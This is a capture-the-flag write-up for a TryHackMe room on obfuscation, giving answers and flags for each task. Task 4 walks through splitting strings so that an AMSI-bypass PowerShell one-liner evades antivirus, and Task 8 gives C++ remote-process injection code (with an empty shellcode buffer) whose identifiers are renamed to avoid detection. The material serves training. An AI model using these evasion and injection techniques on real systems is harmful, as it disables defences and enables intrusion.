---
title: Obfuscation Principles
author: CYB3RM3
name: CYB3RM3 | Obfuscation Principles
date: 2022-10-14 12:07:23 +0100
categories: [TryHackMe, Red Teaming]
tags: [Malware, Obfuscation, SOC, Red Team]
---

Leverage tool-agnostic software obfuscation practices to hide malicious functions and create unique code.

THM Room [https://tryhackme.com/room/obfuscationprinciples](https://tryhackme.com/room/obfuscationprinciples)


## TASK 1 : Introduction
### Read the above and continue to the next task. 
No Answer

## TASK 2 : Origins of Obfuscation
### How many core layers make up the Layered Obfuscation Taxonomy? 
Per Layer Obfuscation Paper <https://cybersecurity.springeropen.com/counter/pdf/10.1186/s42400-020-00049-3.pdf>:

![Layer Obfuscation](/images/thm/obfuscationprinciples/obfuscationprinciples_1.png)
_Layer Obfuscation_

Answer : 4

### What sub-layer of the Layered Obfuscation Taxonomy encompasses meaningless identifiers?

![Obfuscating Layout](/images/thm/obfuscationprinciples/obfuscationprinciples_2.png)
_Obfuscating Layout_

Answer : Obfuscating Layout

## TASK 3 : Obfuscation's Function for Static Evasion
###  What obfuscation method will break or split an object? 

![data splitting](/images/thm/obfuscationprinciples/obfuscationprinciples_3.png)
_data splitting_

Answer : data splitting

### What obfuscation method is used to rewrite static data with a procedure call?
Answer : data procedurization 

## TASK 4 : Object Concatenation 
### What flag is found after uploading a properly obfuscated snippet? 
The following powershell snippet is detect as malicious  :

```powershell
PS C:\Users\Student> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
{: .nolineno }

So i decide to break the command in multiple parts and test those with breaking methods. The first block of code doesn't trigger the malicious content :

```powershell
PS C:\Users\Student> [Ref].Assembly

GAC    Version        Location
---    -------        --------
True   v4.0.30319     C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856...
```
{: .nolineno }

Let's add the first object call :

```powershell
PS C:\Users\Student> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
At line:1 char:1
+ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```
{: .nolineno }

And now with breaking parts for the String parameters :

```powershell
PS C:\Users\Student> [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Automa'+'tion.Amsi'+'Utils')

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
False    False    AmsiUtils                                System.Object
```
{: .nolineno }

It returns something non-blocked so i can repeat the step with the next call block :

```powershell
PS C:\Users\Student> [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Automa'+'tion.Amsi'+'Utils').GetField('amsiIni'+'tFailed','NonP'+'ublic,Sta'+'tic')


Name                   : amsiInitFailed
MetadataToken          : 67114376
FieldHandle            : System.RuntimeFieldHandle
Attributes             : Private, Static
FieldType              : System.Boolean
MemberType             : Field
ReflectedType          : System.Management.Automation.AmsiUtils
DeclaringType          : System.Management.Automation.AmsiUtils
Module                 : System.Management.Automation.dll
IsPublic               : False
IsPrivate              : True
IsFamily               : False
IsAssembly             : False
IsFamilyAndAssembly    : False
IsFamilyOrAssembly     : False
IsStatic               : True
IsInitOnly             : False
IsLiteral              : False
IsNotSerialized        : False
IsSpecialName          : False
IsPinvokeImpl          : False
IsSecurityCritical     : True
IsSecuritySafeCritical : False
IsSecurityTransparent  : False
CustomAttributes       : {}
```
{: .nolineno }

Lastly, adding the "SetValue($null,$true)" return the error again and is detected as malicious. We can evade this by replacing the parameters by other variables :

```powershell
PS C:\Users\Student> $x = $null
PS C:\Users\Student> $y = $true
PS C:\Users\Student> [Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Automa'+'tion.Amsi'+'Utils').GetField('amsiIni'+'tFailed','NonP'+'ublic,Sta'+'tic').SetValue($x,$y)
```
{: .nolineno }

Not detected. Let's submit this snippet to the webserver to get the flag :

evade.ps1 :

```powershell
$x = $null
$y = $true
[Ref].Assembly.GetType('Sys'+'tem.Manag'+'ement.Automa'+'tion.Amsi'+'Utils').GetField('amsiIni'+'tFailed','NonP'+'ublic,Sta'+'tic').SetValue(x,y)
```
{: .nolineno }

![Upload evade.ps1](/images/thm/obfuscationprinciples/obfuscationprinciples_4.png)
_Upload evade.ps1_

![Flag](/images/thm/obfuscationprinciples/obfuscationprinciples_5.png)
_Flag_

Answer : THM{koNC473n473_4Ll_7H3_7H1n95}

## TASK 5 : Obfuscation's Function for Analysis Deception
### What are junk instructions referred to as in junk code?

![junk code](/images/thm/obfuscationprinciples/obfuscationprinciples_6.png)
_junk code_

Answer : code stubs

### What obfuscation layer aims to confuse an analyst by manipulating the code flow and abstract syntax trees?

Answer : obfuscating controls

## TASK 6 : Code Flow and Logic 
### Can logic change and impact the control flow of a program? (T/F) 

 "To make this concept concrete, we can observe an example function and its corresponding CFG (Control Flow Graph) to depict it’s possible control flow paths."

```text
x = 10 
if(x > 7):
	print("This executes")
else:
	print("This is ignored")
```
{: .nolineno }

Answer : T

## TASK 7 : Arbitrary Control Flow Patterns
### What flag is found after properly reversing the provided snippet?
After doing some iteration to understand the logic flow, we can add the code snippet in a python script and run it :

```console
C:\Users\test\Downloads>python3 challenge2.py
T
H
M
{
D
3
c
o
d
3
d
!
!
!
}
```
{: .nolineno }

Answer : THM{D3cod3d!!!}

## TASK 8 : Protecting and Stripping Identifiable Information
### What flag is found after uploading a properly obfuscated snippet? 
First, recreate the challenge-8.cpp file :

```cpp
root@ip-10-10-107-112:~/Desktop# cat challenge-8.cpp 
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
} 
```
{: .nolineno }

Then we need to compile this with MingW32-G++. I checked for the syntax to used and found the the call to x86_64-w64-mingw32-g++ as a command. We can now look at the help :

```console
root@ip-10-10-107-112:~/Desktop# x86_64-w64-mingw32-g++ --help
Usage: x86_64-w64-mingw32-g++ [options] file...
Options:
  -pass-exit-codes         Exit with highest error code from a phase.
  --help                   Display this information.
  --target-help            Display target specific command line options.
  --help={common|optimizers|params|target|warnings|[^]{joined|separate|undocumented}}[,...].
                           Display specific types of command line options.
  (Use '-v --help' to display command line options of sub-processes).
  --version                Display compiler version information.
  -dumpspecs               Display all of the built in spec strings.
  -dumpversion             Display the version of the compiler.
  -dumpmachine             Display the compiler's target processor.
  -print-search-dirs       Display the directories in the compiler's search path.
  -print-libgcc-file-name  Display the name of the compiler's companion library.
  -print-file-name=<lib>   Display the full path to library <lib>.
  -print-prog-name=<prog>  Display the full path to compiler component <prog>.
  -print-multiarch         Display the target's normalized GNU triplet, used as
                           a component in the library path.
  -print-multi-directory   Display the root directory for versions of libgcc.
  -print-multi-lib         Display the mapping between command line options and
                           multiple library search directories.
  -print-multi-os-directory Display the relative path to OS libraries.
  -print-sysroot           Display the target libraries directory.
  -print-sysroot-headers-suffix Display the sysroot suffix used to find headers.
  -Wa,<options>            Pass comma-separated <options> on to the assembler.
  -Wp,<options>            Pass comma-separated <options> on to the preprocessor.
  -Wl,<options>            Pass comma-separated <options> on to the linker.
  -Xassembler <arg>        Pass <arg> on to the assembler.
  -Xpreprocessor <arg>     Pass <arg> on to the preprocessor.
  -Xlinker <arg>           Pass <arg> on to the linker.
  -save-temps              Do not delete intermediate files.
  -save-temps=<arg>        Do not delete intermediate files.
  -no-canonical-prefixes   Do not canonicalize paths when building relative
                           prefixes to other gcc components.
  -pipe                    Use pipes rather than intermediate files.
  -time                    Time the execution of each subprocess.
  -specs=<file>            Override built-in specs with the contents of <file>.
  -std=<standard>          Assume that the input sources are for <standard>.
  --sysroot=<directory>    Use <directory> as the root directory for headers
                           and libraries.
  -B <directory>           Add <directory> to the compiler's search paths.
  -v                       Display the programs invoked by the compiler.
  -###                     Like -v but options quoted and commands not executed.
  -E                       Preprocess only; do not compile, assemble or link.
  -S                       Compile only; do not assemble or link.
  -c                       Compile and assemble, but do not link.
  -o <file>                Place the output into <file>.
  -pie                     Create a position independent executable.
  -shared                  Create a shared library.
  -x <language>            Specify the language of the following input files.
                           Permissible languages include: c c++ assembler none
                           'none' means revert to the default behavior of
                           guessing the language based on the file's extension.

Options starting with -g, -f, -m, -O, -W, or --param are automatically
 passed on to the various sub-processes invoked by x86_64-w64-mingw32-g++.  In order to pass
 other options on to these processes the -W<letter> options must be used.

For bug reporting instructions, please see:
<https://gcc.gnu.org/bugs/>.
```
{: .nolineno }

We can try with the general usage form and adding the -o for setting up the output file name as challenge-8.exe :

```console
root@ip-10-10-107-112:~/Desktop# x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
root@ip-10-10-107-112:~/Desktop# ls
'Additional Tools'   challenge-8.cpp   challenge-8.execlear   reverse.exe
 chal2.py            challenge-8.exe   mozo-made-15.desktop   Tools
```
{: .nolineno }

When uploading this to the webserver the payload failed :

![Uploading payload](/images/thm/obfuscationprinciples/obfuscationprinciples_7.png)
_Uploading payload_

![Uploading payload](/images/thm/obfuscationprinciples/obfuscationprinciples_8.png)
_Uploading payload_

We can try to redo the previous step after obfuscate the cpp file changing all variables names :

```console
root@ip-10-10-107-112:~/Desktop# cat challenge-8.cpp 
#include "windows.h"
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char slce[] = "";

	HANDLE pshe;
	HANDLE retd;
	PVOID rebr;

	pshe = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	rebr = VirtualAllocEx(pshe, NULL, sizeof slce, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pshe, rebr, slce, sizeof slce, NULL);
	retd = CreateRemoteThread(pshe, NULL, 0, (LPTHREAD_START_ROUTINE)rebr, NULL, 0, NULL);
	CloseHandle(pshe);

	return 0;
} 
root@ip-10-10-107-112:~/Desktop# x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe
root@ip-10-10-107-112:~/Desktop# ls | grep "challenge-8"
challenge-8.cpp
challenge-8.exe
```
{: .nolineno }

And this time it's works :

![Flag](/images/thm/obfuscationprinciples/obfuscationprinciples_9.png)
_Flag_

Answer : THM{Y0Ur_1NF0_15_M1N3}

## TASK 9 : Conclusion 
### Read the above and continue learning! 
No Answer.